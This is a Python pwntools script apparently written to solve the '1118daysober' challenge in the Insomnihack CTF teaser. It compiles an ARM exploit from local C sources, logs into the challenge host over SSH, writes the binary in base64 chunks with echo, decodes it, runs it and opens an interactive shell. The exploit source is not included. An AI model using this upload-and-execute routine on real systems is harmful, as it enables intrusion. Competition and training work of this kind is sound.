#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

from pwn import *
#from brucepwn import *
import os
import base64
os.system("arm-linux-gnueabi-gcc -nostdlib lib.c  memmem.c  exp.c -o exp")
#os.system("gzip -f exp")
file = open("exp.sh","w")

def send_cmd(cmd):
    global file
    file.write(cmd+"\n")
    r.sendlineafter("$", cmd)
s = ssh(host='1118daysober.teaser.insomnihack.ch',user='1118daysober',password='1118daysober')
r = s.shell()

#r = s.process("/bin/sh")

#r.interactive()

#log.success("prepare empty binary...")
#send_cmd("cp /bin/busybox /home/user/poc")
#send_cmd("cp /bin/busybox /home/user/pwn")
#send_cmd("echo -ne \"\" > /home/user/poc")

#r = process("./run.sh")

iii = open("./exp", "rb").read() # pwn binary

b64 = base64.b64encode(iii).decode('ascii') #iii.encode('base64')
#b64 = ''.join(b64.split("\n"))
now = 0

log.success("write base64 string to binary...")
seg = 500
while now < len(b64):
    cur = b64[now:now+seg:]
    cmd = "echo -ne \"{}\" >> /home/user/poc".format(cur)
    log.info("sending {} / {} ...".format(now+seg, len(b64)))
    send_cmd(cmd)
    now += seg

log.success("base64 decoding...")
send_cmd("base64 -d /home/user/poc > /home/user/exp")
send_cmd("cd /home/user/")
send_cmd("chmod +x exp")
send_cmd("./exp")
file.close()
r.interactive()
